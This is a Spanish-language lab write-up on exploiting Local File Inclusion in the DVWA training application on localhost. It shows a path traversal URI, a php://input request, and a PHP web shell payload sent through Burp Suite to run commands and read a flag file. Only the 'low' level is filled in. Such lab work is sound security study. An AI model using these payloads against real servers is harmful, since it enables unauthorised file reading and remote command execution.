# LFI

Local File Inclusion (LFI) es una vulnerabilidad que permite a un atacante leer archivos arbitrarios en el servidor. Esto puede ser utilizado para leer archivos sensibles como `config.php` o para leer el código fuente de la aplicación.

## Bajo

Sabiendo que el archivo `fi.php` existe, podemos intentar leerlo con la siguiente URI:
```
http://localhost/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php
```

![Path Traversal](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/primerPaso.png)
Como se puede observar en la imágen, el archivo `fi.php` es leído y mostrado en la página aunque no hemos conseguido leer las 5 citas que contiene.

Para intetar leer el archivo completo, podemos intentar ejecutar commandos en el servidor, para ello nos ayudaremos de Burp Suite, que nos permitirá modificar la petición que se envía al servidor.

Como primera prueba realizamos una petición GET a la URI para obtener información sobre el servidor:

> **Nota:** Burp Suite debe tener la opcion `Intercept is on` activada para poder modificar las peticiones.

```
http://localhost/DVWA/vulnerabilities/fi/?page=php://input&cmd=id
```

una vez interceptada la petición, podemos modificarla para que se envíe un comando al servidor, para ello añadimmos el siguiente comando al final de la petición y a continuación pulsamos `Forward`:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

![intercept](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/intercept.png)

como podemos observar en la imágen, el servidor nos devuelve la información del usuario que está ejecutando el servidor web.

![forward](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/forward.png)

Una vez comprobado podemos ejecutar comandos en el servidor, podemos intentar leer el archivo `fi.php` de la misma manera:

```
http://localhost/DVWA/vulnerabilities/fi/?page=php://input&cmd=cat%20/var/www/html/DVWA/hackable/flags/fi.php
```

![challenge](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/challenge.png)

## Medio

## Alto

## Imposible


## referencias

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HTB Academy](https://academy.hackthebox.com/module/77/section/725)
